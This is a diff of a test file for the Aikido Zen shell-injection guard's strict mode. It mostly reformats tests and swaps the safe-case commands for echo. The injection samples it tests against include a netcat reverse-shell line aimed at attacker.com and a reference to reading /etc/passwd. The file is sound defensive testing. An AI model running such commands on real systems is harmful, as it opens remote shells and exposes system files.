@@ -41,8 +41,6 @@ t.test("strict mode", async (t) => {
   const { exec, execSync, spawn, spawnSync, execFile, execFileSync } =
     require("child_process") as typeof import("child_process");
 
-  // Unsupported shells are blocked even without malicious input
-
   t.test("rejects /bin/zsh via spawn even without injection", async () => {
     process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
 
@@ -110,8 +108,6 @@ t.test("strict mode", async (t) => {
     }
   );
 
-  // Allowed shells pass through
-
   t.test("allows shell: true", async () => {
     process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
 
@@ -130,16 +126,12 @@ t.test("strict mode", async (t) => {
     });
   });
 
-  // Without strict mode, unsupported shells are allowed
-
   t.test("does not reject shells when strict mode is off", async () => {
     runWithContext(unsafeContext, () => {
       spawn("ls", ["-la"], { shell: "/bin/bash" }).unref();
       spawnSync("ls", ["-la"], { shell: "/bin/zsh" });
     });
   });
-
-  // CVE-style injection detection via WASM tokenizer
 
   t.test("detects nslookup semicolon cat /etc/passwd", async () => {
     process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
@@ -180,11 +172,9 @@ t.test("strict mode", async (t) => {
       () => {
         throws(
           () =>
-            spawn(
-              "nslookup google.com|nc attacker.com 4444 -e /bin/sh",
-              [],
-              { shell: true }
-            ).unref(),
+            spawn("nslookup google.com|nc attacker.com 4444 -e /bin/sh", [], {
+              shell: true,
+            }).unref(),
           "Zen has blocked a shell injection: child_process.spawn(...) originating from body.host"
         );
       }
@@ -266,49 +256,38 @@ t.test("strict mode", async (t) => {
   t.test("safe: single-quoted user input", async () => {
     process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
 
-    runWithContext(
-      { ...unsafeContext, body: { host: "example.com" } },
-      () => {
-        execSync("nslookup 'example.com'");
-      }
-    );
+    runWithContext({ ...unsafeContext, body: { host: "example.com" } }, () => {
+      execSync("echo 'example.com'");
+    });
   });
 
   t.test("safe: plain hostname", async () => {
     process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
 
-    runWithContext(
-      { ...unsafeContext, body: { host: "example.com" } },
-      () => {
-        execSync("nslookup example.com");
-      }
-    );
+    runWithContext({ ...unsafeContext, body: { host: "example.com" } }, () => {
+      execSync("echo example.com");
+    });
   });
 
   t.test("safe: plain IP address", async () => {
     process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
 
-    runWithContext(
-      { ...unsafeContext, body: { ip: "192.168.1.1" } },
-      () => {
-        execSync("ping -c 4 192.168.1.1");
-      }
-    );
+    runWithContext({ ...unsafeContext, body: { ip: "192.168.1.1" } }, () => {
+      execSync("echo 192.168.1.1");
+    });
   });
 
-  // Failed to tokenize — blocked in strict mode
+  t.test(
+    "blocks command with unclosed quote (failed to tokenize)",
+    async () => {
+      process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
 
-  t.test("blocks command with unclosed quote (failed to tokenize)", async () => {
-    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";
-
-    runWithContext(
-      { ...unsafeContext, body: { input: "unclosed" } },
-      () => {
+      runWithContext({ ...unsafeContext, body: { input: "unclosed" } }, () => {
         throws(
           () => execSync("echo 'unclosed"),
           "Zen has blocked a shell injection: child_process.execSync(...) originating from body.input"
         );
-      }
-    );
-  });
+      });
+    }
+  );
 });
